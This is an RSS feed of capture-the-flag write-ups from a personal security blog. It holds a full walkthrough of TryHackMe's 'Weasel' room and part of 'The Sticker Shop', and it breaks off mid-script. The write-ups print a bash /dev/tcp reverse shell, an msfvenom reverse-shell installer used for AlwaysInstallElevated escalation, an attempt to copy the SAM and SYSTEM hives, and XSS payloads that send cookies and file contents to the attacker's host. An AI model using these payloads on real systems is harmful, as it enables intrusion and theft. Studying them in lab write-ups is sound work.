<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>THM on Ep1cac</title>
    <link>http://localhost:1313/tags/thm/</link>
    <description>Recent content in THM on Ep1cac</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>Ep1cac</copyright>
    <lastBuildDate>Mon, 23 Dec 2024 12:13:37 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/thm/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
    
    
    <item>
      <title>Weasel</title>
      <link>http://localhost:1313/posts/weasel/</link>
      <pubDate>Mon, 23 Dec 2024 12:13:37 -0500</pubDate>
      
      <guid>http://localhost:1313/posts/weasel/</guid>
      <description><![CDATA[<p><img src="/img/weasel/weasel.png" alt="Weasel"></p>
<h2 id="description">Description</h2>
<p>Weasel is a Medium difficulty challenge on Tryhackme. We get a foothold on WSL through Jupyter Notebook and find a SSH key that allows us to SSH into the Windows host. Finally, we escalate privileges by exploiting AlwaysInstallElevated with a malicious Windows Installer file.</p>
<h2 id="recon">Recon</h2>
<p>First thing&rsquo;s first. Let&rsquo;s start with a nmap scan.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Dec 22 23:42:51 2024 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.34.193
Increasing send delay for 10.10.34.193 from 0 to 5 due to 547 out of 1366 dropped probes since last increase.
Increasing send delay for 10.10.34.193 from 5 to 10 due to 11 out of 21 dropped probes since last increase.
Nmap scan report for 10.10.34.193
Host is up (0.26s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-23T06:11:34+00:00
|_ssl-date: 2024-12-23T06:11:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Issuer: commonName=DEV-DATASCI-JUP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-12-22T03:04:54
| Not valid after:  2025-06-23T03:04:54
| MD5:   cc8d:e018:37dd:d6b2:b0b9:556e:9c44:156b
|_SHA-1: 159e:345a:b60d:485b:e255:25fd:6bd2:7cc0:1eaa:67eb
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8888/tcp  open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
| http-methods: 
|_  Supported Methods: GET POST
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
|_http-server-header: TornadoServer/6.0.3
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (90%), Microsoft Windows 8 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 Update 1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-23T06:11:35
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   137.61 ms 10.13.0.1
2   ... 3
4   263.53 ms 10.10.34.193

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 23 00:11:48 2024 -- 1 IP address (1 host up) scanned in 1737.39 seconds
</code></pre><p>We some interesting ports open. Looking at port 8888, there is a notebook server.</p>
<p><img src="/img/weasel/jupyter.png" alt="Jupyter interface"></p>
<p>Unfortunately, we don&rsquo;t have a token or password. Next, I took a look at the SMB shares on port 445 and noticed that guest access was allowed.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ nxc smb 10.10.34.193 -u guest -p &#39;&#39; --shares
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Enumerated shares
SMB         10.10.34.193    445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.34.193    445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.34.193    445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.34.193    445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.34.193    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.34.193    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
</code></pre><p>We have read and write permissions on the nonstandard <code>datasci-team</code>  share. Taking</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ smbclient //10.10.34.193/datasci-team -U guest --password=&#39;&#39;
Try &#34;help&#34; to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Dec 22 21:13:41 2024
  ..                                  D        0  Sun Dec 22 21:13:41 2024
  .ipynb_checkpoints                 DA        0  Thu Aug 25 10:26:47 2022
  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 10:26:46 2022
  misc                               DA        0  Thu Aug 25 10:26:47 2022
  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 10:26:46 2022
  papers                             DA        0  Thu Aug 25 10:26:47 2022
  pics                               DA        0  Thu Aug 25 10:26:47 2022
  requirements.txt                    A       12  Thu Aug 25 10:26:46 2022
  weasel.ipynb                        A     4308  Thu Aug 25 10:26:46 2022
  weasel.txt                          A       51  Thu Aug 25 10:26:46 2022

                15587583 blocks of size 4096. 8928179 blocks available
smb: \&gt; 
</code></pre><p>I transferred everything to my local machine for easier enumeration.</p>
<pre tabindex="0"><code>smb: \&gt; lcd /tmp/smb
smb: \&gt; recurse on
smb: \&gt; prompt off
smb: \&gt; mget *
getting file \Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv of size 146 as Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \MPE63-3_745-757.pdf of size 414804 as MPE63-3_745-757.pdf (109.2 KiloBytes/sec) (average 68.5 KiloBytes/sec)
getting file \requirements.txt of size 12 as requirements.txt (0.0 KiloBytes/sec) (average 58.5 KiloBytes/sec)
getting file \weasel.ipynb of size 4308 as weasel.ipynb (4.7 KiloBytes/sec) (average 52.4 KiloBytes/sec)
getting file \weasel.txt of size 51 as weasel.txt (0.1 KiloBytes/sec) (average 47.1 KiloBytes/sec)
getting file \.ipynb_checkpoints\requirements-checkpoint.txt of size 12 as .ipynb_checkpoints/requirements-checkpoint.txt (0.0 KiloBytes/sec) (average 42.6 KiloBytes/sec)
getting file \.ipynb_checkpoints\weasel-checkpoint.ipynb of size 5972 as .ipynb_checkpoints/weasel-checkpoint.ipynb (6.3 KiloBytes/sec) (average 39.4 KiloBytes/sec)
getting file \misc\jupyter-token.txt of size 52 as misc/jupyter-token.txt (0.1 KiloBytes/sec) (average 36.3 KiloBytes/sec)
getting file \papers\BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf of size 3491735 as papers/BI002_2613_Cz-40-2_Acta-T34-nr25-347-359_o.pdf (177.8 KiloBytes/sec) (average 124.9 KiloBytes/sec)
getting file \papers\Dillard_Living_Like_Weasels.pdf of size 45473 as papers/Dillard_Living_Like_Weasels.pdf (34.7 KiloBytes/sec) (average 121.3 KiloBytes/sec)
getting file \pics\57475-weasel-facts.html of size 301025 as pics/57475-weasel-facts.html (110.1 KiloBytes/sec) (average 120.4 KiloBytes/sec)
getting file \pics\long-tailed-weasel of size 250269 as pics/long-tailed-weasel (72.2 KiloBytes/sec) (average 116.1 KiloBytes/sec)
getting file \pics\Weasel of size 229746 as pics/Weasel (81.6 KiloBytes/sec) (average 113.8 KiloBytes/sec)
</code></pre><p>A lot of stuff about weasels, but also the file <code>jupyter-token.txt</code> in <code>misc</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
└─$ ls -al misc 
total 4
drwxrwxr-x 2 kali kali  60 Dec 22 21:15 .
drwxrwxr-x 6 kali kali 220 Dec 22 21:15 ..
-rw-r--r-- 1 kali kali  52 Dec 22 21:15 jupyter-token.txt
                                                                                                                                            
┌──(kali㉿kali)-[/tmp/smb]
└─$ cat misc/jupyter-token.txt
067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a
</code></pre><h2 id="foothold">Foothold</h2>
<p>We are able to use this token to login to Jupyter Notebook on port 8888, where we can edit <code>weasel.ipynb</code> or create a new Jupyter notebook file to get a shell.</p>
<p><img src="/img/weasel/logon.png" alt="Jupyter authenticated"></p>
<p>I tried to use Python to execute PowerShell and get a reverse shell that way. I wasn&rsquo;t able to get a connection, and after some testing realized that Windows-specific features like PowerShell simply weren&rsquo;t being executed correctly. On the other hand, Linux commands were working perfectly fine. Given that our nmap scan revealed many details that our target is a Windows machine (e.g. RDP and Microsoft RPC). It&rsquo;s fairly safe to say that we are up against WSL.</p>
<p><img src="/img/weasel/compare.png" alt="PowerShell vs Bash"></p>
<p>So I got a shell using bash.</p>
<p><img src="/img/weasel/ipy_shell.png" alt="Python os shell"></p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50376
bash: cannot set terminal process group (10): Invalid argument
bash: no job control in this shell
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
</code></pre><h2 id="breaking-out-of-wsl">Breaking out of WSL</h2>
<p>Checking sudo permissions is something I always do early one since it&rsquo;s usually an easy win, so I quickly found that <code>/home/dev-datasci/.local/bin/jupyter</code> can be executed with root privileges without a password.</p>
<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
sudo -l
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci
        -c *
</code></pre><p>We have write permissions to <code>/home/dev-datasci/.local/bin/</code>, and since there isn&rsquo;t a <code>jupyter</code> file there, we can create our own.</p>
<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ pwd
pwd
/home/dev-datasci/datasci-team
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ls -al ../.local/bin
ls -al ../.local/bin
total 0
drwxrwxrwx 1 dev-datasci dev-datasci 4096 Aug 25  2022 .
drwx------ 1 dev-datasci dev-datasci 4096 Aug 25  2022 ..
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3
-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3.8
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.13.48.55/80 0&gt;&amp;1&#39;&#34; &gt; ../.local/bin/jupyter
echo &#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.13.48.55/80 0&gt;&amp;1&#39;&#34; &gt; ../.local/bin/jupyter
(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ chmod +x ../.local/bin/jupyter
chmod +x ../.local/bin/jupyter
</code></pre><p>Now to leverage our sudo privileges and execute it as root&hellip;</p>
<pre tabindex="0"><code>(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter
sudo /home/dev-datasci/.local/bin/jupyter
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/smb]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 50863
bash: cannot set terminal process group (10): Invalid argument
bash: no job control in this shell
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# 
</code></pre><p>With root privileges, we now have a better chance of escaping the WSL environment and onto the host OS. I tried to navigate to the host filesystem under <code>/mnt</code>. It contains a mount to the C drive, but it&rsquo;s empty&hellip;</p>
<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt
ls -al /mnt
total 0
drwxr-xr-x 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
drwxrwxrwx 1 root root 4096 Aug 25  2022 c
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt/c
ls -al /mnt/c
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
</code></pre><p>Since we are root, we can remount the filesystem.</p>
<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# sudo mount -t drvfs C: /mnt/c
sudo mount -t drvfs C: /mnt/c
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -al /mnt/c
ls -al /mnt/c
ls: cannot read symbolic link &#39;/mnt/c/Documents and Settings&#39;: Permission denied
ls: cannot access &#39;/mnt/c/pagefile.sys&#39;: Permission denied
ls: &#39;/mnt/c/System Volume Information&#39;: Permission denied
total 0
drwxrwxrwx 1 root root 4096 Aug 25  2022 $Recycle.Bin
drwxrwxrwx 1 root root 4096 Mar 14  2023 .
drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
lrwxrwxrwx 1 root root   12 Aug 25  2022 Documents and Settings
drwxrwxrwx 1 root root 4096 Aug 25  2022 PerfLogs
drwxrwxrwx 1 root root 4096 Aug 25  2022 Program Files
drwxrwxrwx 1 root root 4096 Aug 25  2022 Program Files (x86)
drwxrwxrwx 1 root root 4096 Mar 13  2023 ProgramData
drwxrwxrwx 1 root root 4096 Aug 25  2022 Recovery
d--x--x--x 1 root root 4096 Aug 25  2022 System Volume Information
drwxrwxrwx 1 root root 4096 Aug 25  2022 Users
drwxrwxrwx 1 root root 4096 Mar 13  2023 Windows
drwxrwxrwx 1 root root 4096 Dec 22 19:56 datasci-team
-????????? ? ?    ?       ?            ? pagefile.sys
</code></pre><p>I tried to find ways to pivot to the host environment like copying the <code>HKLM\SAM</code> and <code>HKLM\SYSTEM</code> registries to dump local SAM hashes and searching for credentials in files. Unfortunately, all of these lead nowhere.<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SAM /tmp/sam
cp /mnt/c/Windows/System32/config/SAM /tmp/sam
cp: cannot open &#39;/mnt/c/Windows/System32/config/SAM&#39; for reading: Permission denied
root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
cp /mnt/c/Windows/System32/config/SYSTEM /tmp/system
cp: cannot open &#39;/mnt/c/Windows/System32/config/SYSTEM&#39; for reading: Permission denied
</code></pre><p>I eventually fell back to WSL to look for other clues. We see a ssh private key in the <code>dev-datasci</code> user&rsquo;s home directory.</p>
<pre tabindex="0"><code>root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team$ ls ..
ls ..
anaconda3
anacondainstall.sh
datasci-team
dev-datasci-lowpriv_id_ed25519
</code></pre><p>RID cycling confirms <code>dev-datasci-lowpriv</code> is a valid user on the Windows machine.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ nxc smb 10.10.34.193 -u guest -p &#39;&#39; --rid-brute
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\guest: 
SMB         10.10.34.193    445    DEV-DATASCI-JUP  500: DEV-DATASCI-JUP\Administrator (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  501: DEV-DATASCI-JUP\Guest (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  503: DEV-DATASCI-JUP\DefaultAccount (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  504: DEV-DATASCI-JUP\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  513: DEV-DATASCI-JUP\None (SidTypeGroup)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  1000: DEV-DATASCI-JUP\dev-datasci-lowpriv (SidTypeUser)
SMB         10.10.34.193    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (SidTypeUser)
</code></pre><p>We can therefore ssh onto the Windows host OS.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>We can use WinPEAS to facilitate our enumeration. I transferred it to the Windows host through scp.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ scp -i /tmp/id_rsa ~/winPEASany.exe dev-datasci-lowpriv@10.10.34.193:C:\Users\datasci-team\winpeas.exe    
winPEASany.exe
</code></pre><p>The filename did get jumbled up, so I renamed it for clarity.</p>
<pre tabindex="0"><code>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;dir 
 Volume in drive C has no label. 
 Volume Serial Number is 8AA3-53D1

 Directory of C:\Users\dev-datasci-lowpriv

12/22/2024  08:30 PM    &lt;DIR&gt;          .
12/22/2024  08:30 PM    &lt;DIR&gt;          ..
08/25/2022  05:20 AM    &lt;DIR&gt;          .ssh
08/25/2022  04:22 AM    &lt;DIR&gt;          3D Objects
08/25/2022  04:22 AM    &lt;DIR&gt;          Contacts
08/25/2022  06:39 AM    &lt;DIR&gt;          Desktop
08/25/2022  04:22 AM    &lt;DIR&gt;          Documents
08/25/2022  04:22 AM    &lt;DIR&gt;          Downloads
08/25/2022  04:22 AM    &lt;DIR&gt;          Favorites
08/25/2022  04:22 AM    &lt;DIR&gt;          Links
08/25/2022  04:22 AM    &lt;DIR&gt;          Music
08/25/2022  04:22 AM    &lt;DIR&gt;          Pictures
08/25/2022  04:22 AM    &lt;DIR&gt;          Saved Games
08/25/2022  04:22 AM    &lt;DIR&gt;          Searches
12/22/2024  08:31 PM         9,841,664 Usersdatasci-teamwinpeas.exe
08/25/2022  04:22 AM    &lt;DIR&gt;          Videos
               1 File(s)      9,841,664 bytes
              15 Dir(s)  36,645,306,368 bytes free

dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;ren Usersdatasci-teamwinpeas.exe winpeas.exe
</code></pre><p>Running WinPEAS reveals a couple things of interest. First, <code>dev-datasci-lowpriv</code> has permissions to run Windows Installer packages with elevated privileges.</p>
<p><img src="/img/weasel/install_elevated.png" alt="Winpeas AlwaysInstallElevated"></p>
<p><code>dev-datasci-lowpriv</code> also has its credentials stored for AutoLogon.</p>
<p><img src="/img/weasel/autologin.png" alt="AutoLogon credentials"></p>
<p>Now all we need to do is create a malicious .msi file and install it on the Windows host for privilege escalation. I generated one using msfvenom.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.13.48.55 LPORT=8000 -f msi -o shell.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: shell.msi
</code></pre><p>After transferring it onto our target, we can execute it. I had to explicitly run msiexec as <code>dev-datasci-lowpriv</code> with &ldquo;runas&rdquo;.</p>
<pre tabindex="0"><code>dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv&gt;runas /user:dev-datasci-lowpriv &#34;msiexec /quiet /i C:\Users\dev-datasci-low
priv\shell.msi&#34;
Enter the password for dev-datasci-lowpriv:
Attempting to start msiexec /quiet /i C:\Users\dev-datasci-lowpriv\shell.msi as user &#34;DEV-DATASCI-JUP\dev-datasci-lowpriv&#34; ...
</code></pre><p>And now we have a shell as <code>nt authority\system</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ rlwrap nc -nvlp 8000
listening on [any] 8000 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.34.193] 53713
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system
</code></pre><div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>You can read still the flags here, but AFAIK getting command execution on Windows isn&rsquo;t possible from the mounted filesystem.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>The Sticker Shop</title>
      <link>http://localhost:1313/posts/the_sticker_shop/</link>
      <pubDate>Fri, 29 Nov 2024 16:02:41 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/the_sticker_shop/</guid>
      <description><![CDATA[<p><img src="/img/the_sticker_shop/the_sticker_shop.png#center" alt="The Sticker Shop"></p>
<h2 id="description">Description</h2>
<p><a href="https://tryhackme.com/r/room/thestickershop">The Sticker Shop</a> is an easy-rated challenge on Tryhackme. We exfiltrate <code>flag.txt</code> from the web server through a XSS attack.</p>
<h2 id="walkthrough">Walkthrough</h2>
<p>We are told that we need to read the flag at <code>http://10.10.102.204:8080/flag.txt</code>. However, visiting the URL, we are met with a 401 Unauthorized message, meaning we are not authenticated to view the file.</p>
<p><img src="/img/the_sticker_shop/401.png" alt="Direct access 401 forbidden"></p>
<p>If we backtrack to the webapp&rsquo;s homepage, we see that there is a page for submitting feedback where we can presumably send content to the sticker shop staff. This might be our way in.</p>
<p><img src="/img/the_sticker_shop/feedback.png" alt=""></p>
<p>I started by sending a simple XSS payload to attempt to exfiltrate user cookies.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://10.13.48.55/?c=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.102.204 - - [29/Nov/2024 19:56:47] &#34;GET /?c= HTTP/1.1&#34; 200 -
10.10.102.204 - - [29/Nov/2024 19:56:58] &#34;GET /?c= HTTP/1.1&#34; 200 -
</code></pre><p>Unfortunately, this does not work. The webapp may have some sort of defense mechanism (e.g. HttpOnly). Heck, it may not be using cookies at all. Without further information, it will be difficult to obtain any account secrets, if they exist in the first place. We need to focus on directly accessing <code>flag.txt</code> through our XSS payload instead.</p>
<p>A quick and dirty way of doing this would be embedding <code>flag.txt</code>&rsquo;s contents into a query string. Below is a payload that reads <code>flag.txt</code> on the server side and sends the data back to us with a GET request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#34;http://10.13.48.55&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:8080/flag.txt&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>);
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p><img src="/img/the_sticker_shop/flag_get.png" alt="Quick and dirty GET flag"></p>
<hr>
<h2 id="beyond-pwn">Beyond Pwn</h2>
<p>But what if you want to read a file that is much larger, or you don&rsquo;t want the data to be visible in the URL, perhaps for greater stealth? In that case, you would be better off using POST instead of GET.
For unstructured data, sending data as plaintext will suffice.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendData</span>(<span style="color:#a6e22e">data</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://10.13.48.55&#34;</span>, {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://127.0.0.1:8080/flag.txt&#34;</span>)
